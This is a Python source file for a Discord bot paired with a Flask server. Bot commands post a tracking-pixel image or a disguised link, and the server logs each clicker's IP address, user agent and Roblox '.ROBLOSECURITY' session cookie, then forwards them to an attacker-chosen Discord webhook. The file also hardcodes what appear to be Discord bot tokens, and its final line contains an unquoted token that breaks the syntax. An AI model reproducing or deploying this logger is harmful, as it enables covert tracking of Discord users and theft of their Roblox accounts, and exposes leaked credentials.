import discord
from discord.ext import commands
import requests
import sqlite3
import json
import os
from datetime import datetime
from flask import Flask, request
from threading import Thread

# --- CONFIG ---
TOKEN = 'MTUzMDkwMTU2NTU4MDM3ODIxOA.Gn6mEw.jVIlO_ChKHaNu7uWRbxOeGJXsq7CGx3wuCIUt0'
DB_FILE = 'logs.db'

# --- GLOBALS ---
target_webhook = None
target_channel = None
mode = None  # 'image' or 'cookie'

# --- DB INIT ---
conn = sqlite3.connect(DB_FILE, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS clicks
             (user_id TEXT, username TEXT, timestamp TEXT, ip TEXT, user_agent TEXT, roblox_cookie TEXT)''')
conn.commit()

# --- BOT SETUP ---
bot = commands.Bot(command_prefix='§', intents=discord.Intents.all())

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

@bot.command()
async def v2webhook(ctx, webhook_url: str):
    global target_webhook
    target_webhook = webhook_url
    await ctx.send("use §v2channel *channel id*")

@bot.command()
async def v2channel(ctx, channel_id: int):
    global target_channel
    target_channel = bot.get_channel(channel_id)
    if target_channel is None:
        await ctx.send("Invalid channel ID")
        return
    await ctx.send("now last step use §v2create image or §v2create cookie")

@bot.command()
async def v2create(ctx, choice: str, *, arg=None):
    global mode
    if choice.lower() == 'image':
        mode = 'image'
        image_url = arg if arg else "https://example.com/fake.png"
        tracking_url = f"https://your-server.com/collect?user_id={ctx.author.id}&guild={ctx.guild.id}&mode=image&img={image_url}"
        embed = discord.Embed(title="Click to view image", color=0xff0000)
        embed.set_image(url=tracking_url)
        await ctx.send(embed=embed)
    elif choice.lower() == 'cookie':
        mode = 'cookie'
        link = "https://docs.google.com/forms/d/e/1FAIpQLSd3Z-z2n9uCrzfkdItJZnVJnLpw5nXUZheSWjnje3WYaibt4g/viewform"
        tracking_url = f"https://your-server.com/collect?user_id={ctx.author.id}&guild={ctx.guild.id}&mode=cookie&redirect={link}"
        await ctx.send(f"Click here: {tracking_url}")
    else:
        await ctx.send("Invalid choice. Use image or cookie.")

# --- FLASK WEBHOOK RECEIVER ---
app = Flask(__name__)

@app.route('/collect', methods=['GET'])
def collect():
    user_id = request.args.get('user_id')
    mode_param = request.args.get('mode', 'unknown')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')
    timestamp = datetime.utcnow().isoformat()
    cookie = request.cookies.get('.ROBLOSECURITY', 'Not provided')
    # Save to DB
    c.execute("INSERT INTO clicks (user_id, username, timestamp, ip, user_agent, roblox_cookie) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, 'unknown', timestamp, ip, ua, cookie))
    conn.commit()
    # Send to Discord via webhook if set
    if target_webhook:
        data = {
            "content": f"**CLICK** User {user_id} | IP {ip} | UA {ua} | Cookie: {cookie[:20]}... | Mode: {mode_param}"
        }
        requests.post(target_webhook, json=data)
    # Redirect or serve pixel
    if mode_param == 'cookie':
        redirect_url = request.args.get('redirect', 'https://example.com')
        return f'<script>window.location.href="{redirect_url}"</script>', 200, {'Content-Type': 'text/html'}
    else:
        return b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b', 200, {'Content-Type': 'image/gif'}

# --- RUN ---
if __name__ == '__main__':
    Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False)).start()
    bot.run(MTUzMDkwMTU2NTU4MDM3ODIxOA.G_LmaK.dWKdYsyKDSVyg1iG9xwZ7msmu3qR0OvHqmp-kQ)
